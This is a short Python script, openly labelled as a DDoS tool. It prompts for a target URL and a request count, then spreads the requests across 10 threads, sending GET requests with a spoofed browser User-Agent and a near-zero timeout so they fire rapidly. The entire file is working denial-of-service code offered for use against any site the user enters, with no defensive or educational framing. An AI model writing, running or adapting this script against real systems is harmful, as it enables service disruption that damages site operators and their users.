import requests
import threading

def ddos(url, num_requests):
    headers = {'User-Agent': 'Mozilla/5.0'}
    for _ in range(num_requests):
        try:
            requests.get(url, headers=headers, timeout=0.00000001)
        except requests.RequestException:
            pass
def main():
    url = input("Enter the URL to DDoS (e.g., http://example.com): ").strip()
    num_requests = int(input("Enter the number of requests to send: "))
    
    threads = []
    for _ in range(10):  # Create 10 threads
        thread = threading.Thread(target=ddos, args=(url, num_requests // 10))
        threads.append(thread)
        thread.start()
            
    for thread in threads:
        thread.join()
if __name__ == "__main__":
    main()